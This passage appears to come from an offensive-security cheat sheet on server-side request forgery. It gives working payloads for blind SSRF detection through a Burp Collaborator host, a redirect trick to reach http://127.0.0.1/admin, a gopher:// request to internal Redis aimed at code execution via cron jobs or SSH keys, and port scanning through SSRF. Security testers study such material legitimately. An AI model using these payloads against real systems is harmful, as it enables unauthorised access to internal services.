## 7. Blind SSRF Detection (Burp Collaborator)
| Step | Action |
|---|---|
| 1 | Burp → Collaborator client → Copy payload (e.g. `abcd1234.burpcollaborator.net`) |
| 2 | Inject into suspected SSRF param: `http://abcd1234.burpcollaborator.net/` |
| 3 | Send request, wait, click "Poll now" in Collaborator |
| 4 | DNS/HTTP interaction shown = confirmed blind SSRF |

---

## 8. Redirect-Based Filter Bypass
| Step | Action |
|---|---|
| 1 | Host a simple server (or use `http://your-vps/redirect`) |
| 2 | Set 302 redirect → `http://127.0.0.1/admin` |
| 3 | Submit your server's URL as the SSRF param |
| 4 | If app follows redirect blindly → filter bypassed |

---

## 9. SSRF → RCE via Redis (Gopher)
```
gopher://127.0.0.1:6379/_%0d%0aSET%20key%20value%0d%0a
```
Used to write malicious cron jobs or SSH keys once Redis is reachable internally — advance chaining technique, practice this only inside labs first.

---

## 10. Port Scanning via SSRF
| Approach | Detail |
|---|---|
| Response timing | Closed port = fast fail; open port = slower/different response |
| Error message diff | Compare error text for open vs closed port responses |
| Loop through common ports | 22, 80, 443, 3306, 6379, 8080, 9200, 11211 |

